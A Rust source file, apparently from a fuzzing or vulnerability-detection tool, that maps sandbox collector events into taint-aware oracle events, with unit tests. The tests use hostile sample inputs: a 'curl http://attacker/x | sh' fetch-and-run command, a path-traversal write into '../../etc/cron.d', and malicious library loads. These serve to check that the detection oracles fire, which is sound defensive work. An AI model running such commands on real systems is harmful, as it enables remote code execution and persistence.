// SPDX-License-Identifier: Apache-2.0

//! Map a [`CollectorEvent`] into the generic runtime-oracle event vocabulary.
//!
//! This is the seam that lets the existing bug-oracle registry (and future
//! semantic predicates) consume collector events with no knowledge of the
//! collector wire format. Taint handling mirrors the established cross-execution
//! correlation model: only an `input_derived` event that carries a byte-origin
//! `taint_offset` becomes a `Tainted*` variant (taint-confirmed). A
//! fixed-constant effect — the target always does it, regardless of input —
//! maps to the plain variant and can therefore never be reported as
//! input-controlled. That gate is what keeps the registry from flooding on
//! effects the target performs on every single run.

use crate::normalize::normalize_path;
use crate::schema::{CollectorEvent, EventKind};
use finding_rules::oracle_sdk::OracleRuntimeEvent;

/// A representative API label for an event kind, used for human-readable oracle
/// evidence (the runtime oracles themselves do not gate on it).
fn api_label(kind: &EventKind) -> &'static str {
    match kind {
        EventKind::ProcessCreate => "CreateProcess",
        EventKind::ShellExecute => "ShellExecute",
        EventKind::FileCreate | EventKind::FileOpen => "open",
        EventKind::FileWrite => "write",
        EventKind::FileRename => "rename",
        EventKind::FileDelete => "unlink",
        EventKind::ModuleLoad => "LoadLibrary",
        EventKind::Network => "connect",
        EventKind::Registry => "RegOpenKey",
        EventKind::Unknown(_) => "unknown",
    }
}

/// Build the command string for a process/shell event: `[verb] image args...`.
fn command_string(ev: &CollectorEvent) -> String {
    let mut parts: Vec<String> = Vec::new();
    if let Some(verb) = &ev.verb {
        parts.push(verb.clone());
    }
    if let Some(image) = &ev.process.image {
        parts.push(image.clone());
    } else if let Some(path) = &ev.path {
        parts.push(path.clone());
    }
    parts.extend(ev.args.iter().cloned());
    parts.join(" ")
}

/// Map a collector event to the oracle vocabulary, or `None` for kinds that have
/// no oracle family (for example `registry`, or an unknown future kind).
///
/// `root` is the target's allowed filesystem root; file paths are resolved
/// against it so the oracle sees the normalized/resolved path.
pub fn to_oracle_event(ev: &CollectorEvent, root: &str) -> Option<OracleRuntimeEvent> {
    let api = api_label(&ev.kind).to_owned();
    let tainted = ev.is_tainted();
    let offset = ev.taint_offset.unwrap_or(0);

    match &ev.kind {
        EventKind::ProcessCreate | EventKind::ShellExecute => {
            let command = command_string(ev);
            if command.is_empty() {
                return None;
            }
            if tainted {
                Some(OracleRuntimeEvent::TaintedCommand {
                    api,
                    command,
                    taint_offset: offset,
                })
            } else {
                Some(OracleRuntimeEvent::Command { api, command })
            }
        }
        EventKind::ModuleLoad => {
            let library = ev.path.clone()?;
            if library.is_empty() {
                return None;
            }
            if tainted {
                Some(OracleRuntimeEvent::TaintedLibrary {
                    api,
                    library,
                    taint_offset: offset,
                })
            } else {
                Some(OracleRuntimeEvent::Library { api, library })
            }
        }
        EventKind::FileCreate | EventKind::FileOpen | EventKind::FileWrite => {
            let raw = ev.path.as_deref()?;
            let path = normalize_path(root, raw).normalized;
            if tainted {
                Some(OracleRuntimeEvent::TaintedFilePath {
                    api,
                    path,
                    taint_offset: offset,
                })
            } else {
                Some(OracleRuntimeEvent::FilePath { api, path })
            }
        }
        EventKind::FileDelete | EventKind::FileRename => {
            let raw = ev.path.as_deref()?;
            let path = normalize_path(root, raw).normalized;
            if tainted {
                Some(OracleRuntimeEvent::TaintedDestructivePath {
                    api,
                    path,
                    taint_offset: offset,
                })
            } else {
                Some(OracleRuntimeEvent::FileDeletion { api, path })
            }
        }
        EventKind::Network => {
            let address = ev.address.clone().or_else(|| ev.path.clone())?;
            if address.is_empty() {
                return None;
            }
            if tainted {
                Some(OracleRuntimeEvent::TaintedNetworkAddress {
                    api,
                    address,
                    taint_offset: offset,
                })
            } else {
                Some(OracleRuntimeEvent::NetworkAddress { api, address })
            }
        }
        // `registry` has no oracle family in the current SDK, and an unknown
        // future kind is deliberately not forced into one.
        EventKind::Registry | EventKind::Unknown(_) => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::schema::EventPhase;
    use finding_rules::oracle_registry::ORACLE_REGISTRY;

    const ROOT: &str = "/srv/sandbox";

    fn base(kind: EventKind) -> CollectorEvent {
        CollectorEvent::new("tc", 0, 1, EventPhase::Event, kind)
    }

    fn registry_hits(ev: &OracleRuntimeEvent) -> Vec<String> {
        ORACLE_REGISTRY
            .iter()
            .filter_map(|oracle| oracle.evaluate(ev).map(|hit| hit.oracle_name))
            .collect()
    }

    #[test]
    fn process_create_maps_to_command() {
        let mut ev = base(EventKind::ProcessCreate);
        ev.process.image = Some("/usr/bin/sh".into());
        ev.args = vec!["-c".into(), "echo hi".into()];
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        assert!(matches!(mapped, OracleRuntimeEvent::Command { .. }));
    }

    #[test]
    fn shell_execute_maps_to_command_with_verb_args() {
        let mut ev = base(EventKind::ShellExecute);
        ev.process.image = Some("C:\\Windows\\System32\\cmd.exe".into());
        ev.verb = Some("runas".into());
        ev.args = vec!["/c".into(), "whoami".into()];
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        match mapped {
            OracleRuntimeEvent::Command { command, .. } => {
                assert!(command.contains("runas"));
                assert!(command.contains("cmd.exe"));
                assert!(command.contains("whoami"));
            }
            other => panic!("expected Command, got {other:?}"),
        }
    }

    #[test]
    fn module_load_maps_to_library() {
        let mut ev = base(EventKind::ModuleLoad);
        ev.path = Some("plugins/evil.dll".into());
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        assert!(matches!(mapped, OracleRuntimeEvent::Library { .. }));
    }

    #[test]
    fn file_write_outside_root_maps_to_filepath() {
        let mut ev = base(EventKind::FileWrite);
        ev.path = Some("../escaped.bin".into());
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        match mapped {
            OracleRuntimeEvent::FilePath { path, .. } => {
                assert_eq!(path, "/srv/escaped.bin");
            }
            other => panic!("expected FilePath, got {other:?}"),
        }
        // The escape itself is detectable via the normalizer.
        assert!(crate::normalize::escapes_root(ROOT, "../escaped.bin"));
    }

    #[test]
    fn input_derived_event_maps_to_tainted_variant() {
        let mut ev = base(EventKind::ModuleLoad);
        ev.path = Some("plugins/evil.dll".into());
        ev.input_derived = true;
        ev.taint_offset = Some(16);
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        match mapped {
            OracleRuntimeEvent::TaintedLibrary { taint_offset, .. } => {
                assert_eq!(taint_offset, 16);
            }
            other => panic!("expected TaintedLibrary, got {other:?}"),
        }
    }

    #[test]
    fn fixed_constant_event_not_tainted() {
        // input_derived == false => plain variant, never taint-confirmed.
        let mut ev = base(EventKind::ShellExecute);
        ev.process.image = Some("/bin/ls".into());
        ev.input_derived = false;
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        assert!(
            matches!(mapped, OracleRuntimeEvent::Command { .. }),
            "a fixed-constant command must map to the plain Command variant"
        );
        // And no taint-gated runtime oracle fires on it.
        assert!(
            !registry_hits(&mapped)
                .iter()
                .any(|name| name == "command-controlled-runtime"),
            "a fixed constant must not become a taint-confirmed finding"
        );
    }

    #[test]
    fn registry_kind_has_no_oracle_family() {
        let mut ev = base(EventKind::Registry);
        ev.path = Some("HKLM\\Software\\Foo".into());
        assert!(to_oracle_event(&ev, ROOT).is_none());
    }

    // --- The three positive classes fire their taint-gated runtime oracles. ---

    #[test]
    fn positive_process_exec_fires_command_runtime() {
        let mut ev = base(EventKind::ShellExecute);
        ev.process.image = Some("/bin/sh".into());
        ev.args = vec!["-c".into(), "curl http://attacker/x | sh".into()];
        ev.input_derived = true;
        ev.taint_offset = Some(0);
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        assert!(registry_hits(&mapped)
            .iter()
            .any(|n| n == "command-controlled-runtime"));
    }

    #[test]
    fn positive_path_control_fires_path_runtime() {
        let mut ev = base(EventKind::FileWrite);
        ev.path = Some("../../etc/cron.d/x".into());
        ev.input_derived = true;
        ev.taint_offset = Some(4);
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        assert!(registry_hits(&mapped)
            .iter()
            .any(|n| n == "path-controlled-open-runtime"));
    }

    #[test]
    fn positive_library_load_fires_library_runtime() {
        let mut ev = base(EventKind::ModuleLoad);
        ev.path = Some("/tmp/evil.so".into());
        ev.input_derived = true;
        ev.taint_offset = Some(8);
        let mapped = to_oracle_event(&ev, ROOT).unwrap();
        assert!(registry_hits(&mapped)
            .iter()
            .any(|n| n == "library-load-controlled-runtime"));
    }
}
